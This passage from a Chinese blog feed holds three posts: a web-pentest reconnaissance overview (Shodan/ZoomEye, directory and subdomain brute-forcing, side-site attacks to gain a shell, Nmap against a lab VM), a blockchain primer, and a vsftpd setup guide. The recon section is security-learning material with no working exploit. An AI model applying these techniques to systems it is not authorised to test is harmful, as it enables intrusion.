<h3 id="1-3-zoomeye和shodan（找寻网段设备）"><a href="#1-3-zoomeye和shodan（找寻网段设备）" class="headerlink" title="1.3 zoomeye和shodan（找寻网段设备）"></a>1.3 zoomeye和shodan（找寻网段设备）</h3><p>  这两个我们常常叫钟馗之眼（我国知道创宇团队开发），以及国外的傻蛋。这两个都是搜索引擎，与常规的搜索引擎可不一样哦，这两个搜索引擎都是用来搜索在互联网中的设备的，比如说路由器交换机，以及摄像头一些设备的，我们可以输入一些特定的语法来搜索一些设备的信息。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202104/image-20210407232707246.png" data-fancybox="group" data-caption="image-20210407232707246" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202104/image-20210407232707246.png" alt="image-20210407232707246" title="image-20210407232707246"></a></p>
<p>​    诸如我们搜索开放ssh服务的主机。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202104/image-20210407232739907.png" data-fancybox="group" data-caption="image-20210407232739907" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202104/image-20210407232739907.png" alt="image-20210407232739907" title="image-20210407232739907"></a></p>
<p>分别是zoomeye以及shodan给我们呈现的结果，这对于我们在得到了一个公司的网段之后，对其进行下一步的资产搜集以及攻击有着很强大的作用。对于这两个工具的使用，那就又是一门很大的学问了，都有专门的用户手册指南，后面如果有机会的话，我会专门写一篇博文来和大家一起学习一下，当然web安全是一门很大的学问，不可能有人是全才，我们只能选择一个领域深入研究，所以有的东西我们不能够完全了解，甚至很多都一知半解，抓住重点就好，如果你以后想从事信息情报搜集，那么强烈建议学习一下这两款强大的引擎。</p>
<h3 id="1-4-御剑以及子域名挖掘（发觉网站服务器下敏感文件以及敏感内容以及对于子域名进一步资产搜集）"><a href="#1-4-御剑以及子域名挖掘（发觉网站服务器下敏感文件以及敏感内容以及对于子域名进一步资产搜集）" class="headerlink" title="1.4 御剑以及子域名挖掘（发觉网站服务器下敏感文件以及敏感内容以及对于子域名进一步资产搜集）"></a>1.4 御剑以及子域名挖掘（发觉网站服务器下敏感文件以及敏感内容以及对于子域名进一步资产搜集）</h3><p>​    御剑使我们经常会用到的一个工具，工具的原理跟简单，有时间我们也可以自己写一个，其原理是利用http协议的响应包状态码来判断是否存在该目录。如果是200就认为该目录存在，通过遍历所给的目录字典加在一个域名的后面循环判断。分别对于不同的网站的不同的后端类型就行不同的判断，php,jsp,asp都有不同的字典，说白了就是爆目录。利用head请求方式，可以使得性能更优。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202104/image-20210407234237518.png" data-fancybox="group" data-caption="image-20210407234237518" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202104/image-20210407234237518.png" alt="image-20210407234237518" title="image-20210407234237518"></a></p>
<p>​    比如说我们对于百度进行目录发现（注意在扫描过程中，线程不要开的太大，小网站会被扫崩，大网站可能会封你IP），我们发现在其下面有一个robots文件（这是给爬虫看的文件）。<a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202104/image-20210407234533296.png" data-fancybox="group" data-caption="image-20210407234533296" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202104/image-20210407234533296.png" alt="image-20210407234533296" title="image-20210407234533296"></a></p>
<p>这是它的内容，这个文件主要用来限定web爬虫可以爬取的范围。相似于御剑的工具，kali linux上还自带了Dirbuster,也是基于这个原理的目录扫描工具，我之前单独写了一篇文章来介绍这个工具的使用，<a href="https://www.evil-qinghua.me/2018/12/17/kali-e5-b7-a5-e5-85-b7-e5-85-a5-e9-97-a8-1dirbuster/">传送门（KALI Dirbuster的使用）</a>。</p>
<p>​    那这里我们思考一个事情，这个工具扫描的一定准确吗？</p>
<p>​    回答是否定的，我说不一定，为啥呢，因为有的网站他配置的那个404不存在的页面，他不会直接报给你404在响应包里面，他会告诉你200然后返回一个页面内容是告诉你404。然后我们的工具探测出来了一看响应200就认为这个页面存在，就误报了，当然是工具肯定不会完美的应对吗，我们人的脑筋还是灵活的，当我们看到一大堆都是200的时候就应该考虑是不是有这个问题存在或者，我们可以制订一个程序的策略对搜集一个页面的内容做一个摘要如果都一样，我们就认为他是404了，这样也可以绕过这个限制。当然，这只是我的一种思路，但我觉得还是存在缺陷，后续如果有更好的想法也可以继续拓展。</p>
<p>​    之后我们介绍一下对于子域名的搜集，对于域名的结构我们应该不陌生。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202104/image-20210408000226693.png" data-fancybox="group" data-caption="image-20210408000226693" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202104/image-20210408000226693.png" alt="image-20210408000226693" title="image-20210408000226693"></a></p>
<p>比如这里，我们说出了域名结构，我通俗点来说就是对于，Baidu.com这个域名，根域名是.com，一级域名是baidu，对于百度我们下面可能有tieba.baidu.com，这个tieba就是baidu的子域名。那么子域名对于我们来说有什么意义呢，这里不得不提一下，我认为是很有必要的，有的时候，我们攻击一个系统的时候，主站攻不下来，可能一个服务器他开了WEB在一个服务器上面，如果在这个服务器上的其他网站有漏洞，那么这个网站也是不安全的，我们可以进行旁站攻击，先得到旁站的shell进而跨越目录攻击主站。子域名有的时候也会出现这种情况，虽然对于目前而言这种情况不多见，因为处于安全考虑，很多公司是不会这样做的，在一个服务器上开许多web服务。但是对于我们的资产搜集也是很有用的。子域名的发现工具同理于目录扫描，不过是加在域名的前面进行扫描遍历。而且要设置多层循环向下遍历。</p>
<p>这里我放一个工具的演示图</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202104/image-20210408001143441.png" data-fancybox="group" data-caption="image-20210408001143441" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202104/image-20210408001143441.png" alt="image-20210408001143441" title="image-20210408001143441"></a></p>
<h3 id="1-5-nmap-扫描神器端口扫描以及服务信息搜集"><a href="#1-5-nmap-扫描神器端口扫描以及服务信息搜集" class="headerlink" title="1.5 nmap(扫描神器端口扫描以及服务信息搜集)"></a>1.5 nmap(扫描神器端口扫描以及服务信息搜集)</h3><p>​    但凡接触过Linux系统或者网络运维的朋友肯定会知道Nmap这款神器，这款工具的受欢迎程度以及强大被众多网络从业者喜爱。我们可以通过nmap对于我们想要的目标IP进行扫描获得其开放的端口服务，以及系统类型等信息。这对于我们下一步进行漏洞利用至关重要。</p>
<p>​    这里我们拿Metasploitable2来做练习，这个虚拟机预设了许多常见的漏洞，这里我们做安全测试以及踩点用。我这里用Nmap对于该主机进行一个简单的端口扫描</p>
<p>这里我用的是windows上的带GUI（图形界面的），我们用命令行也可以得到一样的结果</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202104/image-20210408111403704.png" data-fancybox="group" data-caption="image-20210408111403704" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202104/image-20210408111403704.png" alt="image-20210408111403704" title="image-20210408111403704"></a></p>
<p>发现目标主机开放很多端口 80 http 3306Mysql等等</p>
<p>关于nmap的具体应用我之前写过一个系列的文章来讲述（传送门）</p>
<p><a href="https://www.evil-qinghua.me/2018/12/17/kali-e5-b7-a5-e5-85-b7-e5-85-a5-e9-97-a84-namp-e7-9a-84-e4-bd-bf-e7-94-a8-ef-bc-88-e4-b8-8a-ef-bc-89/">Kali nmap的使用上</a></p>
<p><a href="https://www.evil-qinghua.me/2018/12/17/kali-e5-b7-a5-e5-85-b7-e5-85-a5-e9-97-a84-nmap-e7-9a-84-e4-bd-bf-e7-94-a8-ef-bc-88-e4-b8-ad-ef-bc-89/">Kali nmap的使用中</a></p>
<p><a href="https://www.evil-qinghua.me/2018/12/17/kali-e5-b7-a5-e5-85-b7-e5-85-a5-e9-97-a84-namp-e7-9a-84-e4-bd-bf-e7-94-a8-ef-bc-88-e4-b8-8b-ef-bc-89/">Kali nmap的使用下</a></p>
<h3 id="1-6-其他信息搜集工具"><a href="#1-6-其他信息搜集工具" class="headerlink" title="1.6 其他信息搜集工具"></a>1.6 其他信息搜集工具</h3><p>​    当然，在这里我们要说还有很多其他的信息来源渠道，信息搜集也不止于以上的一些工具方法，以及很棒的信息搜集工具这些我们都能在kali上面找到，当然很多需要梯子去国外的网络搜集信息。诸如利用traceroute进行路由探测，dig进行DNS探测，也可以在进入内网之后利用arping来进行主机存活探测等等。waf00f等进行war探测。后面我会继续更新Kali工具系列来进行更加深一步的探究。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>​    通过简单地复习，回顾了一些进行web渗透学习的一些基本要熟知的简单工具，当然市面上信息搜集工具很多，有许多已经自成一派，并且有着不错的社区环境，想要成为信息搜集的专家，也要经过长时间的训练，学习了以上的这些工具是远远不够用的，情报搜集工作也是一门很大的学问，想要学好，还需要经验的积累以及日后个人的深入探究。</p>
]]></content>
      <categories>
        <category>胡乱折腾</category>
      </categories>
      <tags>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>关于区块链的一些入门1</title>
    <url>/2021/04/06/%E5%85%B3%E4%BA%8E%E5%8C%BA%E5%9D%97%E9%93%BE%E7%9A%84%E4%B8%80%E4%BA%9B%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<h1 id="关于区块链的一些入门1"><a href="#关于区块链的一些入门1" class="headerlink" title="关于区块链的一些入门1"></a>关于区块链的一些入门1</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​        目前打算入门区块链，但是之前仅仅有一些密码学的基础，所以对于区块链的理解仅限于简单的比特币产生原理以及挖矿这玩意是怎么回事上面，然后就单纯的认为就是一个增强版更安全的p2p，不过接触了一些改变了我的一些看法，特此来写一篇博客，来聊聊这些东西，也希望给跟我一样入门的小白科普科普。</p>
<p>​                                                                                                                                                                                      ··青花</p>
<h2 id="1-ETH和ETC的那些事以及区块链的简单原理"><a href="#1-ETH和ETC的那些事以及区块链的简单原理" class="headerlink" title="1 ETH和ETC的那些事以及区块链的简单原理"></a>1 ETH和ETC的那些事以及区块链的简单原理</h2><p>​    接触币圈的朋友们对于ETH和ETC可能不陌生，ETH（以太坊），ETC（以太坊经典），这两者虽然说都叫以太啥的，但是币值可是差了好多啊。那为啥会有这个现象呢，我们不是常说啥的以太坊吗，这个怎么回事咋还经典不经典啊，这里其实就是历史原因的，涉及到一些历史小故事，且听我细细道来。</p>
<p>​    故事还要说2016年，有一个项目，需要用以太币来众筹，因为呢，这个项目系统存在漏洞，结果呢，被黑客盗走了很多币。这就出事了啊，虽然你说你众筹，但是大家的钱都给被黑客盗走了，那咋整啊，恰好参与这个项目的，还有很多圈子里面的大佬，如果是普通人还好，那要是大佬的就不好说了，这些大佬觉得不能就这么算了，我凭什么便宜你黑客啊，这些大佬就决定分差，然后开一条新链，叫从前的币失效，把丢掉的币找回来。这里我们就来讲讲为啥这玩意分差能把从前的货币找回来呢？</p>
<p>​    那我们就要从区块链的这些本质来说说了，说是本质，其实也不太难。啥是区块链，其实在币圈我们就可以理解为一个公共账单，我们的每笔交易记录啥的，都会存在这个账单之中，每个账单我们叫区块，把这些区块通过方法连接起来就是区块链。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/qukuai/image-20210402113651715.png" data-fancybox="group" data-caption="image-20210402113651715" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/qukuai/image-20210402113651715.png" alt="image-20210402113651715" title="image-20210402113651715"></a></p>
<p>​    这是在网络上找的一个简单的示意图。一个区块由很多的交易信息组成，包含着上一个区块的散列以及本区块内所有交易信息的散列，我们知道散列函数的原理，只要任何一点内容变了，就会导致计算结果偏差，这也就是构建了对前面的不可否认性，那么我们如何往里面添加区块的呢，怎么说这个区块就是合法的呢？每个区块的头中会有一个noce（任意数），区块链的添加要求变换这个随机数的值，来计算哈希，这个哈希是有规定的，必须参照一定格式。当你计算出来了这个散列值，就相当于你成功地添加了一个区块到区块链中去，这个区块中的所有交易你就会获得其的手续费奖励。这就是挖矿的一些基本原理。（我个人理解就是暴力求解散列）。这里我们考虑一个问题，如果在某一个时间两个人同时求解出来了一个结果，那我们要相信谁呢？对于这个问题的一般做法，我们通常选择运算能力比较强的一方，什么意思呢？我个人是这样理解的，假设这个人运算能力比较强，那么就可以假设认为他可以为后面源源不断的提供新的区块。就可以使这条链变长，所以有人说选择更长的那一条也是不无道理的。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/qukuai/image-20210406112444084.png" data-fancybox="group" data-caption="image-20210406112444084" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/qukuai/image-20210406112444084.png" alt="image-20210406112444084" title="image-20210406112444084"></a></p>
<p>​    回到正文，那么我们也不难理解为啥他开个新链换个算法就能够找回之前的丢失的币了。这些大佬单独把这些东西拎出来，宣布，你们从前的那些东西无效了，我要在从前的基础上重新开一条新链，我的这个新的叫ETH（以太坊），从前你们的就作废了。</p>
<p>​    这个决定看起来不要紧，其实是在圈子里面炸了锅。什么？你说作废就作废，那我们从前的努力呢？我们的钱咋办？这其实就像某个国家的银行，有一些威慑力，要当老大，号召全世界，我发行货币，大家都要以我的货币为基础，于是大家都以他的货币为基础，后来呢，这个国家变穷了，也就是经济的总体产值相较于其他的国家变低了，那怎么办？这个国家就有了办法了，你们大家都用我的钱做基准，那我印钱啊，印的多了不就经济上去了吗！看起来确实没问题，其实这么说挺霸道的，不过这种说法看起来也没问题，但是长期而言不是个解决方案，久而久之，大家都不傻，大家就都感觉到了，我咋慢慢发展，我咋还变穷了呢？这个事情就会败露，大家就会不信任这个老大了。</p>
<p>​    这里呢区块链的圈子里面就发生了一个类似的事。也不能说全部吧，一部分认为确实应该不能便宜了黑客，另外一部分认为，明明是你系统出的问题，不是本身以太坊的机制有问题，你凭什么说废了就废了，不能违背原则！然后就出现了一部分人坚持原来的ETC（经典以太坊）一部分人加入了新的ETH中去。从此这条链就分差了，分为了这两个不同的分支。但是因为区块链的原理，之前持有ETC的人，在ETH中也会持有等量的ETH。之前听说过发币，好像就是因为这个。</p>
<p>​    关于这两者谁好谁坏呢，目前还没有一个明确的结果，双方的支持者也各有不同，不过存在即合理，还是要看日后的发展了。</p>
<h2 id="2-WEB3-0"><a href="#2-WEB3-0" class="headerlink" title="2 WEB3.0"></a>2 WEB3.0</h2><p>​    这就是一个新的概念了啊，我第一次接触，看到了这个名词，看样子web又要革新了呢。然后在网上搜了搜资料，来说说我的一些看法。</p>
<p>​    有3.0就会有1.0 2.0那么这些都是怎么划分的呢？具体的年代可能没有办法说个大概了，但是我们能够简单的说一说。</p>
<p>WEB1.0 </p>
<p>​    web一开始开发出来就是为了互联的，这个年代我们理解就是把计算机连接起来实现最基本的通信。</p>
<p>WEB2.0</p>
<p>​    这个时代就是web高速发展的时代了，我们肯定接触过一些东西，或多或少吧。这个时代的特点是互动，大家都在网络上创造，开发各种产品，也诞生了许多众所周知的应用。</p>
<p>WEB3.0</p>
<p>​    就是我们现在说的这个WEB3.0关于他到低到来与否，我个人意见还是不太确定，但是总归来说2.0与3.0还有很多相似之处，不同的是3.0在理念上有着一个革新、其实实际上我们可以理解为一个去中心化的网络应用。目前我们所处的web2时代，其主要还是过于集中化，我们现目前不管是应用还是各种服务，大多都是c/s（客户/服务器）架构，都是交由服务器统一处理，集中化处理当然也有集中化处理的好处，但是用户的独立性很差，用户的权限以及自由度大大的受到了限制，其实从这一点来说就好像有点违背了互联网的初衷，因为用户自由度不够。</p>
<p>​    08年中本聪在一篇<a href="https://btcpapers.com/" target="_blank" rel="noopener">论文</a>（比特币白皮书）中提到了比特币这种概念，这个概念其实不得了。可以说开辟了一个新纪元，虽然是说提出一种新型的电子货币系统，但是他的理念特别符合我们对于web3一些想法的憧憬。</p>
<h2 id="3-DAPP与智能合约"><a href="#3-DAPP与智能合约" class="headerlink" title="3 DAPP与智能合约"></a>3 DAPP与智能合约</h2><p>​    Dapp（Decentralized Application），接触到区块链就会接触到这个词，什么是DAPP，简单来说就是去中心化应用，我们在经常应用一些app，web上面的我们称之为web应用，手机上的我们的程序一般都是apk格式的安装包，我们称之为app（application）应用。DAPP是基于区块链技术开发的一种应用，与以太坊交互，其实目前理解可以说还是传统的app，不过思想理念不一样，我们就取了一个新的名字叫dapp，目前而言还是传统的时代，但是随着区块链流行起来渐渐地也有越来越多的应用加入其中，相信在未来一定是潜力无穷的。</p>
<p>​    那么Dapp与传统app有何区别呢，我们知道我们目前大多数应用，不管是访问web还是我们手机软件qq，微信，或者我们玩的游戏之类的，都是要访问服务器的，我们用户用的呈现在前端，许多操作都是我们提交数据然后传递给后端处理，后端代码运行在服务器上。如果服务器瘫痪，那么用户就都没办法使用了。但是Dapp就不一样了，dapp的处理代码运行在分布式存储网络(一般是区块链网络)之上，不依赖于服务器，一切操作和数据都存储在区块链网络中，应用特殊算法生成的Token来鉴别。</p>
<p>​    <strong>DApp=前端+智能合约（Smart Contract）</strong></p>
<p>​    那这里我们说一下智能合约，其实智能合约这个词1990年就有了，但是目前我们说的都是区块链的智能合约（以下都称智能合约）。其实通俗的理解智能合约呢，其实就是区块链的代码（一段可以自动运行的代码），就传统交易而言，我们需要借助政府银行一个可信的第三方来就行中介交易，但是比特币的出现，改变了这一现状，所以去中心化的理念也被大家广泛研究。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/qukuai/image-20210407150528715.png" data-fancybox="group" data-caption="image-20210407150528715" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/qukuai/image-20210407150528715.png" alt="image-20210407150528715" title="image-20210407150528715"></a></p>
<p>​    这是一张只能合约的演示图，其实就是处理我们操作的运行在区块链上的代码，一旦有事件比如说交易等行为发生，它都会自动运行跟踪。我把它理解为自动执行的可信第三方，因为程序电脑总是忠诚的，但是智能合约也不是完美的，他的一些安全性也是未来研究的方向。</p>
<h2 id="4-以太坊"><a href="#4-以太坊" class="headerlink" title="4 以太坊"></a>4 以太坊</h2><p>​    其实在区块链的圈子里面大家也分为了几个阶段，我们通常称之为比特币为1.0阶段，2.0阶段就是以太坊。</p>
<p>​    这里我们就不得不提一个人了，Vitalik Buterin(大家都称其为V神)，他受到了比特币思路的启发之后，提出了一个新的概念，大意就是下一代的加密货币与去中心化的平台。虽然有这种想法的人，V神不是第一个，但是在弥补了比特币的一些缺陷的基础之上，V神的理念绝对是最赞的。以太坊不同于传统的大家开发区块链应用的理念，以太坊要实现的是一个内置了编程语言的区块链协议，由于支持了编程语言，那么理论上任何区块链应用都可以用这门语言进行定义，进而作为一种应用，运行于以太坊的区块链协议之上。而不是像以往的那些项目，各自为政，分别定义自己的区块链协议，而各个协议又只支持一种或几种特定区块链应用，且互不兼容。这就具有很大的魅力了，就比如我喜欢计算机世界，能在其中享受无穷创造的过程。</p>
<p>​    以太坊我们可以理解为一个全球化的计算机，全球化的区块链，他可为所有人使用，我们可以在上面执行我们的程序，我们上文说到的DAPP就可以通过web3.js运行在以太坊之上。</p>
<p>​    以太坊的其他部分：Swarm 和 Whisper<br>​    计算机需要 计算，储存数据 和 交互。以太坊需要有效且稳健的方式，才能实现不停机、抗审查且自我维持的去中心世界计算机这一愿景。以太坊虚拟机器仅仅是整体中的一个元件。</p>
<p>​    以太坊虚拟机是能运行合约逻辑的计算原件。<br>​    这种 计算 不依赖中央服务器<br>​    和 BitTorrent 一样，Swarm 协议是点对点的文件共享协议，不同的是它以小额以太币支付来激励文件存储和分享。文件被分成块，在网络参与者之间分发和存储。存储和传播数据块的节点可以从请求存储和检索服务者处得到 ETH 作为报    酬。<br>​    Swarm 协议的 文件储存 不依赖于中央处理器<br>​    Whisper 是一种加密通讯协议，允许节点间安全地直接发送信息，还能帮助信息发送者和信息接受者屏蔽掉多余的第三方<br>​    Whisper 协议的 通讯 也无需依赖于中央服务器</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>​    通过简单的一些文字简单的介绍了几个我们一开始接触区块链最基本的概念，关于钱包等的概念，我们后续再下面的文章还会做进一步的探究。</p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://ethfans.org/wikis/WEB-3.0%EF%BC%88%E9%9D%9E%E6%8A%80%E6%9C%AF%E7%89%88%EF%BC%89" target="_blank" rel="noopener">web3.0</a></p>
<p><a href="https://ethfans.org/posts/gentle-introduction-ethereum-new-version-with-more-note" target="_blank" rel="noopener">以太坊简介</a></p>
]]></content>
      <categories>
        <category>区块链</category>
      </categories>
      <tags>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title>博客整修小记(vsftp构建简单文件服务器)</title>
    <url>/2021/04/01/%E5%8D%9A%E5%AE%A2%E4%BF%AE%E6%95%B4%E5%B0%8F%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="博客修整小记"><a href="#博客修整小记" class="headerlink" title="博客修整小记"></a>博客修整小记</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​            大家好啊，好久不见，漫长的考研终于结束了，现在也终于可以开心的搞搞技术了，但是长时间没用博客，然后博客都快烂掉了，之前阿里的云服务器到期，我就直接草草的买了半年的OSS然后把图片仓库扔上面了，后面发现很多图片的URL给坏掉了，后面还得修整，因为之前我的博客HEXO的提交实在阿里的ESC上的，所以到期之后我把ESC的文件留了个备份，然后说是到后面在在我的本地主机做一个修整。这里就是修正中用到的一些知识，以及一些问题，在这里做一个记录，也算是练练手。</p>
<p>​                                                                                                                                                                          –青花</p>
<h2 id="1-centos-7-vsftp-服务器搭建"><a href="#1-centos-7-vsftp-服务器搭建" class="headerlink" title="1.centos 7 vsftp 服务器搭建"></a>1.centos 7 vsftp 服务器搭建</h2><h3 id="1-1-搭建之前的一些balabala，sftp的一些小科普"><a href="#1-1-搭建之前的一些balabala，sftp的一些小科普" class="headerlink" title="1.1 搭建之前的一些balabala，sftp的一些小科普"></a>1.1 搭建之前的一些balabala，sftp的一些小科普</h3><p>​        首先做的是要把之前的那些备份下来的文件配置啥的，传到虚拟机里面去，因为我为了轻型，占用资源少，我没有装centos的GUI，直接就是用的命令行，说用VMTOOL这种然后往虚拟机里面托，是不可能的了，所以呢，我们需要搭一个ftp服务。这里提一下，其实如果是小文件的话呢，东西特别少的那种，完全可以不用费这个劲，直接用sftp就可以，这个是一个默认用22号端口的一个轻型的ftp服务，看到这里的同学会说了，22不是ssh的端口吗，怎么还有文件服务，这个我们百度科普一下啊。</p>
<p>在计算机领域，<strong>SSH文件传输协议</strong>（英语：<strong>SSH File Transfer Protocol</strong>，也称<strong>Secret File Transfer Protocol</strong>，中文：安全文件传送协议，英文：<strong>Secure FTP</strong>或字母缩写：<strong>SFTP</strong>）是一<a href="https://baike.baidu.com/item/数据流" target="_blank" rel="noopener">数据流</a>连接，提供文件访问、传输和管理功能的<a href="https://baike.baidu.com/item/网络传输协议" target="_blank" rel="noopener">网络传输协议</a>。</p>
<p>这个是百度的介绍，就简单看看就好，其实就是建立在ssh上的一个小型的ftp服务，不过没那么专业这个东西速度啥的，还是一言难尽。至于利用后面有机会在说一说，废话不多说，我们开始着手搭建一个ftp服务器。</p>
<h3 id="1-2-搭建ftp服务"><a href="#1-2-搭建ftp服务" class="headerlink" title="1.2 搭建ftp服务"></a>1.2 搭建ftp服务</h3><p>​     我们这里用的是VSftp</p>
<p>​    由于我已经下载好了，详细过程就不说了，你可以用wget  yum  apt  各种方式获取</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查询是否系统已经自带了vsftpd ：rpm -q vsftpd</span><br><span class="line"></span><br><span class="line">使用 yum 安装vsftpd：yum -y install vsftpd (或者使用rpm安装vsftpd：rpm -ivh vsftpd-3.0.2-22.el7.x86_64)</span><br><span class="line"></span><br><span class="line">3.启动vsftpd服务：service vsftpd start  (设置开机启动：systemctl enable vsftpd.service)</span><br><span class="line"></span><br><span class="line">检查vsftpd是否开启：ps -e|grep vsftpd 或者 查看21端口是否被监听，netstat -an | grep 21</span><br><span class="line"></span><br><span class="line">可以使用netstat -ntpl | grep vsftpd命令查看到系统现在监听的vsftpd的端口为 21</span><br></pre></td></tr></table></figure></div>

<p>这里要调整一下防火墙的内容，不然可能遇到连接不上去的情况，我这里因为实在本机虚拟机，所以我就把防火墙关了，然后iptable的规则全部清掉了。</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl start firewalld     启动防火墙服务</span><br><span class="line"></span><br><span class="line">firewall-cmd --add-service=ftp     暂时开放ftp服务</span><br><span class="line"></span><br><span class="line">firewall-cmd --add-service=ftp --permanent    永久开放ftp服務</span><br><span class="line"></span><br><span class="line">firewall-cmd --remove-service=ftp --permanent    永久关闭ftp服務</span><br><span class="line"></span><br><span class="line">systemctl restart firewalld    重启firewalld服务</span><br><span class="line"></span><br><span class="line">firewall-cmd --reload    重载配置文件</span><br><span class="line"></span><br><span class="line">firewall-cmd --query-service ftp    查看服务的启动状态</span><br><span class="line"></span><br><span class="line">firewall-cmd --list-all    显示防火墙应用列表</span><br><span class="line"></span><br><span class="line">firewall-cmd --add-port=8001/tcp    添加自定义的开放端口</span><br><span class="line"></span><br><span class="line">iptables -L -n | grep 21    查看设定是否生效</span><br><span class="line"></span><br><span class="line">firewall-cmd --state    检测防火墙状态</span><br><span class="line"></span><br><span class="line">firewall-cmd --permanent --list-port    查看端口列表</span><br></pre></td></tr></table></figure></div>

<p>其实，重点在于对于FTP的控制，不管是目录还是权限这种。其实当我们开启了服务之后，解决掉了防火墙的问题之后，他的默认问题是允许匿名访问的。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202104/image-20210330223302041.png" data-fancybox="group" data-caption="image-20210330223302041" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202104/image-20210330223302041.png" alt="image-20210330223302041" title="image-20210330223302041"></a></p>
<p>我们随便在系统进行访问</p>
<p>ftp:// + 你绑定的Ip</p>
<p>就会出现如此，我们接下来细说目录配置啥的。我之后的命令都在root权限下操作的，为了方便。</p>
<p>主要配置文件是放在，/etc/vsftpd目录下的，当然你下载的压缩包这种，是你指定的，我这里是用Yum弄得。</p>
<p>然后用vim打开目录下的vsftpd.conf文件</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202104/image-20210330224100932.png" data-fancybox="group" data-caption="image-20210330224100932" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202104/image-20210330224100932.png" alt="image-20210330224100932" title="image-20210330224100932"></a></p>
<p>就像如此，我用红框标记出来了，这里允许任何人访问。这里呢，我们一般是不会允许随便叫大家访问的，虽然说可以配权限，但是总归是有风险的，被传个webshell，弄个小马啥的就不好了。</p>
<p>这里我们提几点大家应该注意的权限</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 禁用匿名用户  YES 改为NO anonymous_enable=NO</span><br><span class="line"></span><br><span class="line"># 禁止切换根目录 删除# chroot_local_user=YES</span><br></pre></td></tr></table></figure></div>

<p>配置修改完成之后别忘了重启服务使配置生效。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202104/image-20210330232024397.png" data-fancybox="group" data-caption="image-20210330232024397" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202104/image-20210330232024397.png" alt="image-20210330232024397" title="image-20210330232024397"></a></p>
<p>这里我们添加一个ftp用户。在创建主目录，赋予权限</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202104/image-20210330233434160.png" data-fancybox="group" data-caption="image-20210330233434160" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202104/image-20210330233434160.png" alt="image-20210330233434160" title="image-20210330233434160"></a></p>
<p>但是，这里配置完了拒绝访问</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202104/image-20210330233616808.png" data-fancybox="group" data-caption="image-20210330233616808" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202104/image-20210330233616808.png" alt="image-20210330233616808" title="image-20210330233616808"></a></p>
<p>为啥呢，可能是vsftp还没有配置好。</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202104/image-20210330234738855.png" data-fancybox="group" data-caption="image-20210330234738855" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202104/image-20210330234738855.png" alt="image-20210330234738855" title="image-20210330234738855"></a></p>
<p>进入vsftp配置中，找到这里，然后添加，没有中间哪一行的，自己写上，添加访问权限</p>
<p><a href="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202104/image-20210330234959548.png" data-fancybox="group" data-caption="image-20210330234959548" class="fancybox"><img src="https://blueandwhite.oss-cn-beijing.aliyuncs.com/blog/202104/image-20210330234959548.png" alt="image-20210330234959548" title="image-20210330234959548"></a></p>
